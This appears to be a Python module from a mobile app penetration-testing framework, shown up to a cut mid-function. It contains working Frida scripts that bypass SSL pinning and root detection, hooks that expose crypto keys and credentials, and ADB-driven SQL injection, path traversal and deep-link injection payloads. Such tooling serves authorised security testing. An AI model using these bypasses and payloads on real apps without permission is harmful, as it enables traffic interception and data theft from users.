#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
████████████████████████████████████████████████████████████████████████████████████
██                                                                                ██
██  📱  SIREN DYNAMIC MOBILE — Runtime Exploitation & Analysis  📱               ██
██                                                                                ██
██  Analise dinamica e exploração em tempo real de aplicativos moveis:            ██
██    • SSL/TLS pinning bypass (OkHttp, TrustManager, Conscrypt, custom)         ██
██    • Root/jailbreak detection bypass (RootBeer, SafetyNet, custom)             ██
██    • Frida method hooking & tracing (parameters, return values)               ██
██    • Content provider exploitation (SQL injection, path traversal)             ██
██    • Deep link fuzzing & exploitation                                          ██
██    • Broadcast injection & interception                                        ██
██    • Clipboard monitoring & exfiltration                                       ██
██    • Crypto API hooking (weak algorithms, static IVs, hardcoded keys)         ██
██    • Keystore extraction & key material analysis                              ██
██    • Shared preferences live dump & modification                              ██
██    • Activity/service IPC exploitation                                         ██
██    • WebView JavaScript bridge exploitation                                    ██
██    • Screenshot/screen record during sensitive operations                      ██
██    • Memory scanning for sensitive data (tokens, keys, PII)                   ██
██    • OWASP MASTG dynamic test coverage                                         ██
██                                                                                ██
██  "Em tempo de execucao, tudo se revela."                                       ██
██                                                                                ██
████████████████████████████████████████████████████████████████████████████████████
"""

from __future__ import annotations

import asyncio
import json
import logging
import os
import re
import shlex
import tempfile
import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

from .mobile_engine import (
    ADBBridge,
    FridaEngine,
    MobileFinding,
    MobileTestConfig,
    SecurityLevel,
)

logger = logging.getLogger("siren.dynamic_mobile")


# ════════════════════════════════════════════════════════════════════════════
# ENUMS & CONSTANTS
# ════════════════════════════════════════════════════════════════════════════


class HookType(Enum):
    SSL_PINNING = "ssl_pinning"
    ROOT_DETECTION = "root_detection"
    CRYPTO = "crypto"
    STORAGE = "storage"
    NETWORK = "network"
    IPC = "ipc"
    WEBVIEW = "webview"
    KEYSTORE = "keystore"
    CLIPBOARD = "clipboard"
    LOGGING = "logging"


class ExploitResult(Enum):
    SUCCESS = "success"
    PARTIAL = "partial"
    FAILED = "failed"
    BLOCKED = "blocked"
    NOT_APPLICABLE = "not_applicable"


# ════════════════════════════════════════════════════════════════════════════
# DATA CLASSES
# ════════════════════════════════════════════════════════════════════════════


@dataclass
class HookResult:
    """Result of a Frida hook operation."""

    hook_type: HookType = HookType.SSL_PINNING
    success: bool = False
    method_hooked: str = ""
    class_name: str = ""
    return_value: str = ""
    parameters: List[str] = field(default_factory=list)
    stack_trace: str = ""
    timestamp: float = 0.0
    notes: str = ""


@dataclass
class ContentProviderResult:
    """Result of content provider exploitation."""

    uri: str = ""
    queryable: bool = False
    rows_returned: int = 0
    columns: List[str] = field(default_factory=list)
    sample_data: List[Dict[str, str]] = field(default_factory=list)
    sql_injectable: bool = False
    path_traversal: bool = False
    error: str = ""


@dataclass
class DeepLinkResult:
    """Result of deep link testing."""

    uri: str = ""
    handled: bool = False
    target_activity: str = ""
    intent_data: Dict[str, str] = field(default_factory=dict)
    crash: bool = False
    data_leak: bool = False
    auth_bypass: bool = False
    notes: str = ""


@dataclass
class MemoryScanResult:
    """Result of memory scanning."""

    tokens_found: List[Dict[str, str]] = field(default_factory=list)
    keys_found: List[Dict[str, str]] = field(default_factory=list)
    pii_found: List[Dict[str, str]] = field(default_factory=list)
    urls_found: List[str] = field(default_factory=list)
    passwords_found: int = 0
    total_scanned_bytes: int = 0


@dataclass
class DynamicTestResult:
    """Complete dynamic analysis result."""

    findings: List[MobileFinding] = field(default_factory=list)
    hooks_applied: List[HookResult] = field(default_factory=list)
    content_providers: List[ContentProviderResult] = field(default_factory=list)
    deeplinks_tested: List[DeepLinkResult] = field(default_factory=list)
    memory_scan: Optional[MemoryScanResult] = None
    broadcast_results: List[Dict[str, Any]] = field(default_factory=list)
    ipc_results: List[Dict[str, Any]] = field(default_factory=list)
    webview_results: List[Dict[str, Any]] = field(default_factory=list)
    screenshots: List[str] = field(default_factory=list)
    duration: float = 0.0
    package_name: str = ""


# ════════════════════════════════════════════════════════════════════════════
# FRIDA SCRIPT LIBRARY
# ════════════════════════════════════════════════════════════════════════════


class FridaScriptLibrary:
    """Collection of Frida scripts for mobile security testing."""

    @staticmethod
    def ssl_pinning_bypass_universal() -> str:
        """Universal SSL pinning bypass for Android."""
        return r"""
Java.perform(function() {
    var findings = [];

    // === TrustManager bypass ===
    try {
        var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
        var SSLContext = Java.use('javax.net.ssl.SSLContext');

        var TrustManager = Java.registerClass({
            name: 'com.siren.TrustManager',
            implements: [X509TrustManager],
            methods: {
                checkClientTrusted: function(chain, authType) {},
                checkServerTrusted: function(chain, authType) {},
                getAcceptedIssuers: function() { return []; }
            }
        });

        var ctx = SSLContext.getInstance("TLS");
        ctx.init(null, [TrustManager.$new()], null);
        SSLContext.getInstance.overload('java.lang.String').implementation = function(type) {
            var c = this.getInstance(type);
            c.init(null, [TrustManager.$new()], null);
            findings.push({type: 'SSLContext', status: 'bypassed'});
            return c;
        };
        send({type: 'ssl_bypass', target: 'TrustManager', status: 'hooked'});
    } catch(e) { send({type: 'error', msg: 'TrustManager: ' + e}); }

    // === OkHttp3 CertificatePinner ===
    try {
        var CertPinner = Java.use('okhttp3.CertificatePinner');
        CertPinner.check.overload('java.lang.String', 'java.util.List').implementation =
            function(hostname, peerCertificates) {
                send({type: 'ssl_bypass', target: 'OkHttp3', hostname: hostname});
            };
        CertPinner.check$okhttp.overload('java.lang.String', 'kotlin.jvm.functions.Function0').implementation =
            function(hostname, certificatesLazy) {
                send({type: 'ssl_bypass', target: 'OkHttp3$okhttp', hostname: hostname});
            };
    } catch(e) {}

    // === Conscrypt ===
    try {
        var Conscrypt = Java.use('org.conscrypt.TrustManagerImpl');
        Conscrypt.verifyChain.implementation = function() {
            send({type: 'ssl_bypass', target: 'Conscrypt', status: 'bypassed'});
            return arguments[0];
        };
    } catch(e) {}

    // === Apache HTTP ===
    try {
        var AllowAll = Java.use('org.apache.http.conn.ssl.AllowAllHostnameVerifier');
        // Already allows all — just log
    } catch(e) {}

    // === SSLPeerUnverifiedException handler ===
    try {
        var SSLPeerEx = Java.use('javax.net.ssl.SSLPeerUnverifiedException');
        SSLPeerEx.$init.implementation = function(msg) {
            send({type: 'ssl_bypass', target: 'SSLPeerUnverifiedException', msg: msg});
            return this.$init("bypassed");
        };
    } catch(e) {}

    // === WebView SSL errors ===
    try {
        var WebViewClient = Java.use('android.webkit.WebViewClient');
        WebViewClient.onReceivedSslError.implementation = function(view, handler, error) {
            handler.proceed();
            send({type: 'ssl_bypass', target: 'WebView', status: 'proceeded'});
        };
    } catch(e) {}

    // === NetworkSecurityPolicy ===
    try {
        var NSP = Java.use('android.security.net.config.NetworkSecurityPolicy');
        NSP.isCleartextTrafficPermitted.overload().implementation = function() {
            return true;
        };
        NSP.isCleartextTrafficPermitted.overload('java.lang.String').implementation = function(h) {
            return true;
        };
    } catch(e) {}

    send({type: 'ssl_bypass', status: 'complete', count: findings.length});
});
"""

    @staticmethod
    def root_detection_bypass() -> str:
        """Universal root/jailbreak detection bypass."""
        return r"""
Java.perform(function() {
    var bypassed = [];

    // === RootBeer ===
    try {
        var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
        RootBeer.isRooted.implementation = function() {
            send({type: 'root_bypass', target: 'RootBeer.isRooted'});
            return false;
        };
        RootBeer.isRootedWithoutBusyBoxCheck.implementation = function() { return false; };
        RootBeer.detectRootManagementApps.implementation = function() { return false; };
        RootBeer.detectPotentiallyDangerousApps.implementation = function() { return false; };
        RootBeer.detectTestKeys.implementation = function() { return false; };
        RootBeer.checkForBusyBoxBinary.implementation = function() { return false; };
        RootBeer.checkForSuBinary.implementation = function() { return false; };
        RootBeer.checkSuExists.implementation = function() { return false; };
        RootBeer.checkForRWPaths.implementation = function() { return false; };
        RootBeer.checkForDangerousProps.implementation = function() { return false; };
        RootBeer.checkForRootNative.implementation = function() { return false; };
        RootBeer.detectRootCloakingApps.implementation = function() { return false; };
        bypassed.push('RootBeer');
    } catch(e) {}

    // === SafetyNet / Play Integrity ===
    try {
        var SafetyNet = Java.use('com.google.android.gms.safetynet.SafetyNetApi');
        // Hook at attestation response level
    } catch(e) {}

    // === Generic root checks ===
    try {
        var Runtime = Java.use('java.lang.Runtime');
        var origExec = Runtime.exec.overload('[Ljava.lang.String;');
        origExec.implementation = function(args) {
            var cmd = args[0];
            if (cmd === 'su' || cmd === 'which su' || cmd === '/system/bin/su' ||
                (typeof cmd === 'string' && (cmd.indexOf('su') !== -1 || cmd.indexOf('busybox') !== -1))) {
                send({type: 'root_bypass', target: 'Runtime.exec', cmd: cmd});
                throw Java.use('java.io.IOException').$new('blocked by siren');
            }
            return origExec.call(this, args);
        };
    } catch(e) {}

    // === File.exists for root binaries ===
    try {
        var File = Java.use('java.io.File');
        var rootPaths = ['/system/app/Superuser.apk', '/system/bin/su', '/system/xbin/su',
                         '/sbin/su', '/data/local/xbin/su', '/data/local/bin/su',
                         '/su/bin/su', '/system/sd/xbin/su', '/data/local/su',
                         '/magisk', '/sbin/.magisk', '/system/xbin/busybox'];

        File.exists.implementation = function() {
            var path = this.getAbsolutePath();
            for (var i = 0; i < rootPaths.length; i++) {
                if (path === rootPaths[i]) {
                    send({type: 'root_bypass', target: 'File.exists', path: path});
                    return false;
                }
            }
            return this.exists();
        };
        bypassed.push('File.exists');
    } catch(e) {}

    // === Build.TAGS ===
    try {
        var Build = Java.use('android.os.Build');
        Build.TAGS.value = 'release-keys';
        bypassed.push('Build.TAGS');
    } catch(e) {}

    // === SystemProperties ===
    try {
        var SystemProperties = Java.use('android.os.SystemProperties');
        SystemProperties.get.overload('java.lang.String').implementation = function(key) {
            if (key === 'ro.build.tags') {
                return 'release-keys';
            }
            if (key === 'ro.debuggable' || key === 'ro.secure') {
                return '0';
            }
            return this.get(key);
        };
        bypassed.push('SystemProperties');
    } catch(e) {}

    // === PackageManager check for root apps ===
    try {
        var PM = Java.use('android.app.ApplicationPackageManager');
        var rootApps = ['com.topjohnwu.magisk', 'eu.chainfire.supersu', 'com.koushikdutta.superuser',
                        'com.noshufou.android.su', 'com.thirdparty.superuser', 'com.yellowes.su'];
        PM.getPackageInfo.overload('java.lang.String', 'int').implementation = function(pkg, flags) {
            for (var i = 0; i < rootApps.length; i++) {
                if (pkg === rootApps[i]) {
                    send({type: 'root_bypass', target: 'PackageManager', pkg: pkg});
                    throw Java.use('android.content.pm.PackageManager$NameNotFoundException').$new(pkg);
                }
            }
            return this.getPackageInfo(pkg, flags);
        };
        bypassed.push('PackageManager');
    } catch(e) {}

    send({type: 'root_bypass', status: 'complete', bypassed: bypassed});
});
"""

    @staticmethod
    def crypto_monitor() -> str:
        """Hook cryptographic operations to detect weak usage."""
        return r"""
Java.perform(function() {
    // === Cipher monitoring ===
    try {
        var Cipher = Java.use('javax.crypto.Cipher');
        Cipher.getInstance.overload('java.lang.String').implementation = function(algo) {
            send({type: 'crypto', operation: 'Cipher.getInstance', algorithm: algo});
            if (algo.indexOf('ECB') !== -1 || algo.indexOf('DES') !== -1 ||
                algo.indexOf('RC4') !== -1) {
                send({type: 'crypto_vuln', algorithm: algo, issue: 'weak_algorithm'});
            }
            return this.getInstance(algo);
        };

        Cipher.init.overload('int', 'java.security.Key').implementation = function(mode, key) {
            var keyBytes = key.getEncoded();
            var keyLen = keyBytes ? keyBytes.length : 0;
            send({type: 'crypto', operation: 'Cipher.init', mode: mode,
                  keyAlgo: key.getAlgorithm(), keyLen: keyLen});
            if (keyLen < 16) {
                send({type: 'crypto_vuln', issue: 'short_key', keyLen: keyLen});
            }
            return this.init(mode, key);
        };
    } catch(e) {}

    // === MessageDigest monitoring ===
    try {
        var MD = Java.use('java.security.MessageDigest');
        MD.getInstance.overload('java.lang.String').implementation = function(algo) {
            send({type: 'crypto', operation: 'MessageDigest.getInstance', algorithm: algo});
            if (algo === 'MD5' || algo === 'SHA1' || algo === 'SHA-1') {
                send({type: 'crypto_vuln', algorithm: algo, issue: 'weak_hash'});
            }
            return this.getInstance(algo);
        };
    } catch(e) {}

    // === SecureRandom vs Random ===
    try {
        var Random = Java.use('java.util.Random');
        Random.$init.overload().implementation = function() {
            send({type: 'crypto_vuln', issue: 'insecure_random',
                  detail: 'java.util.Random instead of SecureRandom'});
            return this.$init();
        };
    } catch(e) {}

    // === IvParameterSpec (detect static IVs) ===
    try {
        var IvSpec = Java.use('javax.crypto.spec.IvParameterSpec');
        IvSpec.$init.overload('[B').implementation = function(iv) {
            var hex = '';
            for (var i = 0; i < iv.length; i++) {
                hex += ('0' + (iv[i] & 0xFF).toString(16)).slice(-2);
            }
            send({type: 'crypto', operation: 'IvParameterSpec', iv_hex: hex, iv_len: iv.length});
            // Check for all-zero IV
            var allZero = true;
            for (var j = 0; j < iv.length; j++) {
                if (iv[j] !== 0) { allZero = false; break; }
            }
            if (allZero) {
                send({type: 'crypto_vuln', issue: 'zero_iv', detail: 'All-zero IV detected'});
            }
            return this.$init(iv);
        };
    } catch(e) {}

    // === SecretKeySpec (detect hardcoded keys) ===
    try {
        var SKS = Java.use('javax.crypto.spec.SecretKeySpec');
        SKS.$init.overload('[B', 'java.lang.String').implementation = function(keyBytes, algo) {
            var hex = '';
            for (var i = 0; i < Math.min(keyBytes.length, 8); i++) {
                hex += ('0' + (keyBytes[i] & 0xFF).toString(16)).slice(-2);
            }
            send({type: 'crypto', operation: 'SecretKeySpec', algorithm: algo,
                  keyLen: keyBytes.length, keyPrefix: hex + '...'});
            send({type: 'crypto_vuln', issue: 'hardcoded_key',
                  detail: 'SecretKeySpec created with raw bytes'});
            return this.$init(keyBytes, algo);
        };
    } catch(e) {}

    // === KeyStore ===
    try {
        var KS = Java.use('java.security.KeyStore');
        KS.load.overload('java.io.InputStream', '[C').implementation = function(stream, pass) {
            send({type: 'crypto', operation: 'KeyStore.load',
                  hasPassword: pass !== null, passwordLen: pass ? pass.length : 0});
            return this.load(stream, pass);
        };
    } catch(e) {}

    send({type: 'crypto_monitor', status: 'installed'});
});
"""

    @staticmethod
    def storage_monitor() -> str:
        """Hook data storage operations."""
        return r"""
Java.perform(function() {
    // === SharedPreferences monitoring ===
    try {
        var Editor = Java.use('android.app.SharedPreferencesImpl$EditorImpl');
        Editor.putString.implementation = function(key, value) {
            send({type: 'storage', operation: 'SharedPrefs.putString', key: key,
                  valueLen: value ? value.length : 0,
                  preview: value ? value.substring(0, 50) : ''});
            var lower = key.toLowerCase();
            if (lower.indexOf('token') !== -1 || lower.indexOf('password') !== -1 ||
                lower.indexOf('secret') !== -1 || lower.indexOf('key') !== -1 ||
                lower.indexOf('session') !== -1 || lower.indexOf('auth') !== -1) {
                send({type: 'storage_vuln', issue: 'sensitive_in_prefs',
                      key: key, detail: 'Sensitive data stored in SharedPreferences'});
            }
            return this.putString(key, value);
        };
    } catch(e) {}

    // === SQLite monitoring ===
    try {
        var SQLiteDB = Java.use('android.database.sqlite.SQLiteDatabase');
        SQLiteDB.rawQuery.overload('java.lang.String', '[Ljava.lang.String;').implementation =
            function(sql, args) {
                send({type: 'storage', operation: 'SQLite.rawQuery', sql: sql});
                if (sql.toLowerCase().indexOf('password') !== -1 ||
                    sql.toLowerCase().indexOf('token') !== -1) {
                    send({type: 'storage_vuln', issue: 'sensitive_sql',
                          sql: sql, detail: 'Sensitive data in SQL query'});
                }
                return this.rawQuery(sql, args);
            };

        SQLiteDB.execSQL.overload('java.lang.String').implementation = function(sql) {
            send({type: 'storage', operation: 'SQLite.execSQL', sql: sql});
            return this.execSQL(sql);
        };
    } catch(e) {}

    // === FileOutputStream monitoring ===
    try {
        var FOS = Java.use('java.io.FileOutputStream');
        FOS.$init.overload('java.io.File').implementation = function(file) {
            send({type: 'storage', operation: 'FileOutputStream', path: file.getAbsolutePath()});
            return this.$init(file);
        };
    } catch(e) {}

    // === ClipboardManager monitoring ===
    try {
        var CM = Java.use('android.content.ClipboardManager');
        CM.setPrimaryClip.implementation = function(clip) {
            var text = clip.getItemAt(0).getText();
            send({type: 'storage', operation: 'Clipboard.set',
                  textLen: text ? text.length : 0,
                  preview: text ? text.toString().substring(0, 50) : ''});
            send({type: 'storage_vuln', issue: 'clipboard_data',
                  detail: 'Data written to clipboard'});
            return this.setPrimaryClip(clip);
        };
    } catch(e) {}

    send({type: 'storage_monitor', status: 'installed'});
});
"""

    @staticmethod
    def network_monitor() -> str:
        """Monitor network requests and responses."""
        return r"""
Java.perform(function() {
    // === URL connections ===
    try {
        var URL = Java.use('java.net.URL');
        URL.openConnection.overload().implementation = function() {
            var url = this.toString();
            send({type: 'network', operation: 'URL.openConnection', url: url});
            if (url.startsWith('http://')) {
                send({type: 'network_vuln', issue: 'cleartext_http', url: url});
            }
            return this.openConnection();
        };
    } catch(e) {}

    // === OkHttp request interceptor ===
    try {
        var Request = Java.use('okhttp3.Request');
        Request.url.implementation = function() {
            var url = this.url();
            send({type: 'network', operation: 'OkHttp.request', url: url.toString()});
            return url;
        };
    } catch(e) {}

    // === WebView loadUrl ===
    try {
        var WV = Java.use('android.webkit.WebView');
        WV.loadUrl.overload('java.lang.String').implementation = function(url) {
            send({type: 'network', operation: 'WebView.loadUrl', url: url});
            if (url.startsWith('http://')) {
                send({type: 'network_vuln', issue: 'webview_cleartext', url: url});
            }
            return this.loadUrl(url);
        };
    } catch(e) {}

    // === HttpURLConnection ===
    try {
        var HURLC = Java.use('java.net.HttpURLConnection');
        HURLC.setRequestProperty.implementation = function(key, value) {
            if (key.toLowerCase() === 'authorization' || key.toLowerCase() === 'cookie') {
                send({type: 'network', operation: 'HttpURLConnection.header',
                      key: key, valuePreview: value.substring(0, 40) + '...'});
            }
            return this.setRequestProperty(key, value);
        };
    } catch(e) {}

    send({type: 'network_monitor', status: 'installed'});
});
"""

    @staticmethod
    def webview_exploit() -> str:
        """Hook WebView for JavaScript bridge exploitation."""
        return r"""
Java.perform(function() {
    var WebView = Java.use('android.webkit.WebView');
    var WebSettings = Java.use('android.webkit.WebSettings');

    // === Log all WebView settings ===
    try {
        WebSettings.setJavaScriptEnabled.implementation = function(enabled) {
            send({type: 'webview', operation: 'setJavaScriptEnabled', enabled: enabled});
            return this.setJavaScriptEnabled(enabled);
        };
        WebSettings.setAllowFileAccess.implementation = function(allow) {
            send({type: 'webview', operation: 'setAllowFileAccess', allow: allow});
            if (allow) send({type: 'webview_vuln', issue: 'file_access_enabled'});
            return this.setAllowFileAccess(allow);
        };
        WebSettings.setAllowFileAccessFromFileURLs.implementation = function(allow) {
            send({type: 'webview', operation: 'setAllowFileAccessFromFileURLs', allow: allow});
            if (allow) send({type: 'webview_vuln', issue: 'file_url_access'});
            return this.setAllowFileAccessFromFileURLs(allow);
        };
        WebSettings.setAllowUniversalAccessFromFileURLs.implementation = function(allow) {
            send({type: 'webview', operation: 'setAllowUniversalAccessFromFileURLs', allow: allow});
            if (allow) send({type: 'webview_vuln', issue: 'universal_access'});
            return this.setAllowUniversalAccessFromFileURLs(allow);
        };
    } catch(e) {}

    // === Track JS interface bridges ===
    try {
        WebView.addJavascriptInterface.implementation = function(obj, name) {
            send({type: 'webview', operation: 'addJavascriptInterface',
                  name: name, class: obj.getClass().getName()});
            send({type: 'webview_vuln', issue: 'js_interface', name: name});
            return this.addJavascriptInterface(obj, name);
        };
    } catch(e) {}

    // === Monitor evaluateJavascript ===
    try {
        WebView.evaluateJavascript.implementation = function(script, callback) {
            send({type: 'webview', operation: 'evaluateJavascript',
                  scriptLen: script.length, preview: script.substring(0, 100)});
            return this.evaluateJavascript(script, callback);
        };
    } catch(e) {}

    send({type: 'webview_monitor', status: 'installed'});
});
"""

    @staticmethod
    def logging_capture() -> str:
        """Capture all Log.* calls for sensitive data detection."""
        return r"""
Java.perform(function() {
    var sensitivePatterns = ['password', 'token', 'secret', 'key', 'auth',
                            'session', 'credit', 'card', 'ssn', 'email',
                            'phone', 'credential', 'bearer', 'api_key'];
    var Log = Java.use('android.util.Log');
    var methods = ['d', 'v', 'i', 'w', 'e'];

    methods.forEach(function(level) {
        try {
            Log[level].overload('java.lang.String', 'java.lang.String').implementation =
                function(tag, msg) {
                    var lower = (tag + msg).toLowerCase();
                    var sensitive = false;
                    for (var i = 0; i < sensitivePatterns.length; i++) {
                        if (lower.indexOf(sensitivePatterns[i]) !== -1) {
                            sensitive = true;
                            break;
                        }
                    }
                    if (sensitive) {
                        send({type: 'logging_vuln', level: level, tag: tag,
                              msg: msg.substring(0, 200)});
                    }
                    return this[level](tag, msg);
                };
        } catch(e) {}
    });

    send({type: 'logging_monitor', status: 'installed'});
});
"""

    @staticmethod
    def activity_lifecycle_monitor() -> str:
        """Monitor Activity lifecycle for auth bypass detection."""
        return r"""
Java.perform(function() {
    try {
        var Activity = Java.use('android.app.Activity');

        Activity.onCreate.overload('android.os.Bundle').implementation = function(bundle) {
            send({type: 'lifecycle', event: 'onCreate',
                  activity: this.getClass().getName(),
                  hasBundle: bundle !== null});
            return this.onCreate(bundle);
        };

        Activity.onResume.implementation = function() {
            send({type: 'lifecycle', event: 'onResume',
                  activity: this.getClass().getName()});
            return this.onResume();
        };

        Activity.startActivity.overload('android.content.Intent').implementation = function(intent) {
            send({type: 'lifecycle', event: 'startActivity',
                  from: this.getClass().getName(),
                  to: intent.getComponent() ? intent.getComponent().getClassName() : 'unknown',
                  action: intent.getAction(),
                  data: intent.getDataString()});
            return this.startActivity(intent);
        };
    } catch(e) {}

    send({type: 'lifecycle_monitor', status: 'installed'});
});
"""


# ════════════════════════════════════════════════════════════════════════════
# CONTENT PROVIDER EXPLOITER
# ════════════════════════════════════════════════════════════════════════════


class ContentProviderExploiter:
    """Exploit Android content providers for data extraction and injection."""

    def __init__(self, adb: ADBBridge, package_name: str) -> None:
        self._adb = adb
        self._package = package_name

    async def enumerate_providers(
        self, exported_providers: List[str]
    ) -> List[ContentProviderResult]:
        """Test all exported content providers."""
        results: List[ContentProviderResult] = []

        for provider in exported_providers:
            # Build common URIs
            authority = provider.split(".")[-1].lower()
            uris = [
                f"content://{self._package}.{authority}/",
                f"content://{provider}/",
                f"content://{self._package}.provider/",
                f"content://{self._package}.fileprovider/",
            ]

            for uri in uris:
                result = await self._test_provider(uri)
                if result.queryable:
                    results.append(result)

                    # Test SQL injection
                    sqli_result = await self._test_sql_injection(uri)
                    if sqli_result:
                        result.sql_injectable = True
                        results.append(sqli_result)

                    # Test path traversal
                    pt_result = await self._test_path_traversal(uri)
                    if pt_result:
                        result.path_traversal = True
                        results.append(pt_result)

        return results

    async def _test_provider(self, uri: str) -> ContentProviderResult:
        """Query a content provider URI."""
        result = ContentProviderResult(uri=uri)

        cmd = f"content query --uri {shlex.quote(uri)}"
        output = await self._adb.shell(cmd)

        if output and "Error" not in output and "No result" not in output:
            result.queryable = True
            lines = output.strip().split("\n")
            result.rows_returned = len(lines)

            # Parse column names from first row
            if lines:
                cols = re.findall(r"(\w+)=", lines[0])
                result.columns = cols

                # Parse sample data
                for line in lines[:5]:
                    row: Dict[str, str] = {}
                    for m in re.finditer(r"(\w+)=([^,\n]+)", line):
                        row[m.group(1)] = m.group(2).strip()
                    if row:
                        result.sample_data.append(row)
        else:
            result.error = output[:200] if output else "No response"

        return result

    async def _test_sql_injection(self, uri: str) -> Optional[ContentProviderResult]:
        """Test for SQL injection in content provider."""
        payloads = [
            ("--where", "1=1"),
            ("--where", "' OR '1'='1"),
            ("--where", "1; SELECT * FROM sqlite_master--"),
            ("--sort", "1 ASC; SELECT * FROM sqlite_master--"),
        ]

        for flag, payload in payloads:
            cmd = (
                f"content query --uri {shlex.quote(uri)} {flag} {shlex.quote(payload)}"
            )
            output = await self._adb.shell(cmd)

            if output and "Error" not in output and "No result" not in output:
                result = ContentProviderResult(uri=f"{uri} [SQLi: {payload}]")
                result.queryable = True
                result.sql_injectable = True
                lines = output.strip().split("\n")
                result.rows_returned = len(lines)
                return result

        return None

    async def _test_path_traversal(self, uri: str) -> Optional[ContentProviderResult]:
        """Test for path traversal in content provider."""
        traversal_payloads = [
            "../../../etc/hosts",
            "..%2F..%2F..%2Fetc%2Fhosts",
            "....//....//....//etc/hosts",
            f"../../../data/data/{self._package}/shared_prefs/",
        ]

        for payload in traversal_payloads:
            test_uri = f"{uri.rstrip('/')}/{payload}"
            cmd = f"content read --uri {shlex.quote(test_uri)}"
            output = await self._adb.shell(cmd)

            if output and "Error" not in output and len(output) > 10:
                result = ContentProviderResult(uri=test_uri)
                result.queryable = True
                result.path_traversal = True
                return result

        return None


# ════════════════════════════════════════════════════════════════════════════
# DEEP LINK FUZZER
# ════════════════════════════════════════════════════════════════════════════


class DeepLinkFuzzer:
    """Fuzz and exploit deep link handlers."""

    def __init__(self, adb: ADBBridge, package_name: str) -> None:
        self._adb = adb
        self._package = package_name

    async def fuzz_deeplinks(
        self,
        schemes: List[str],
        deeplinks: List[str],
        activities: List[str],
    ) -> List[DeepLinkResult]:
        """Fuzz all known deep links and schemes."""
        results: List[DeepLinkResult] = []

        # Test registered deep links
        for link in deeplinks:
            result = await self._test_deeplink(link)
            results.append(result)

        # Test custom schemes with common paths
        common_paths = [
            "/",
            "/login",
            "/auth",
            "/callback",
            "/reset",
            "/admin",
            "/debug",
            "/test",
            "/transfer",
            "/pay",
            "/profile",
            "/settings",
            "/account",
            "/oauth",
            "/redirect",
        ]

        for scheme in schemes:
            for path in common_paths:
                uri = f"{scheme}://host{path}"
                result = await self._test_deeplink(uri)
                if result.handled:
                    results.append(result)

        # Injection payloads via deep links
        for scheme in schemes:
            injection_results = await self._test_injection(scheme)
            results.extend(injection_results)

        # Activity direct launch
        for activity in activities:
            result = await self._test_activity_launch(activity)
            if result.handled:
                results.append(result)

        return results

    async def _test_deeplink(self, uri: str) -> DeepLinkResult:
        """Test a single deep link URI."""
        result = DeepLinkResult(uri=uri)

        cmd = (
            f"am start -a android.intent.action.VIEW "
            f"-d {shlex.quote(uri)} "
            f"-n {self._package}/ 2>&1"
        )
        output = await self._adb.shell(cmd)

        if output:
            result.handled = "Error" not in output and "does not exist" not in output
            if "Starting:" in output:
                m = re.search(r"Starting: Intent \{.*cmp=([^\s}]+)", output)
                if m:
                    result.target_activity = m.group(1)

        # Check for crash
        crash_output = await self._adb.shell(
            f"logcat -d -t 3 -s AndroidRuntime:E | grep -i {self._package}"
        )
        if crash_output and ("FATAL" in crash_output or "Exception" in crash_output):
            result.crash = True

        return result

    async def _test_injection(self, scheme: str) -> List[DeepLinkResult]:
        """Test injection payloads via deep links."""
        results: List[DeepLinkResult] = []

        payloads = [
            # XSS via deep link
            f"{scheme}://host/<script>alert(1)</script>",
            # Path traversal
            f"{scheme}://host/../../../etc/hosts",
            # JavaScript URI
            f"{scheme}://host/redirect?url=javascript:alert(1)",
            # Open redirect
            f"{scheme}://host/redirect?url=https://evil.example",
            # Command injection
            f"{scheme}://host/action?cmd=id",
            # SQL injection
            f"{scheme}://host/user?id=1' OR '1'='1",
            # Intent scheme
            f"intent://#Intent;scheme={scheme};S.url=file:///etc/hosts;end",
        ]

        for payload in payloads:
            result = await self._test_deeplink(payload)
            if result.handled:
                result.notes = f"Injection payload accepted: {payload}"
                results.append(result)

        return results

    async def _test_activity_launch(self, activity: str) -> DeepLinkResult:
        """Try to launch an activity directly."""
        result = DeepLinkResult(uri=f"activity://{activity}")

        cmd = f"am start -n {self._package}/{activity} 2>&1"
        output = await self._adb.shell(cmd)

        if output:
            result.handled = "Error" not in output and "SecurityException" not in output
            if result.handled:
                result.target_activity = activity
                result.notes = "Direct activity launch successful without auth"
                result.auth_bypass = True

        return result


# ════════════════════════════════════════════════════════════════════════════
# BROADCAST EXPLOITER
# ════════════════════════════════════════════════════════════════════════════


class BroadcastExploiter:
    """Exploit broadcast receivers."""

    def __init__(self, adb: ADBBridge, package_name: str) -> None:
        self._adb = adb
        self._package = package_name

    async def test_receivers(
        self, receivers: List[Dict[str, Any]]
    ) -> List[Dict[str, Any]]:
        """Test exported broadcast receivers."""
        results: List[Dict[str, Any]] = []

        for receiver in receivers:
            if not receiver.get("exported"):
                continue

            name = receiver.get("name", "")

            # Send empty broadcast
            cmd = f"am broadcast -a android.intent.action.MAIN -n {self._package}/{name} 2>&1"
            output = await self._adb.shell(cmd)

            result = {
                "receiver": name,
                "exported": True,
                "permission": receiver.get("permission", ""),
                "response": output[:200] if output else "",
                "accepted": bool(output and "Error" not in output),
            }

            # Test with intent filter actions
            for filt in receiver.get("intent_filters", []):
                for action in filt.get("actions", []):
                    action_cmd = f"am broadcast -a {shlex.quote(action)} -n {self._package}/{name} 2>&1"
                    action_output = await self._adb.shell(action_cmd)
                    result[f"action_{action}"] = (
                        action_output[:200] if action_output else ""
                    )

            results.append(result)

        return results


# ════════════════════════════════════════════════════════════════════════════
# IPC EXPLOIT ENGINE
# ════════════════════════════════════════════════════════════════════════════


class IPCExploitEngine:
    """Exploit inter-process communication channels."""

    def __init__(self, adb: ADBBridge, package_name: str) -> None:
        self._adb = adb
        self._package = package_name

    async def test_services(
        self, services: List[Dict[str, Any]]
    ) -> List[Dict[str, Any]]:
        """Test exported services."""
        results: List[Dict[str, Any]] = []

        for service in services:
            if not service.get("exported"):
                continue

            name = service.get("name", "")

            # Try to start service
            cmd = f"am startservice -n {self._package}/{name} 2>&1"
            output = await self._adb.shell(cmd)

            result = {
                "service": name,
                "exported": True,
                "permission": service.get("permission", ""),
                "startable": bool(output and "Error" not in output),
                "response": output[:200] if output else "",
            }

            # Try binding
            # (Limited via ADB — Frida can do more)
            results.append(result)

        return results

    async def test_pending_intents(self) -> List[Dict[str, Any]]:
        """Check for PendingIntent vulnerabilities via dumpsys."""
        results: List[Dict[str, Any]] = []

        output = await self._adb.shell(
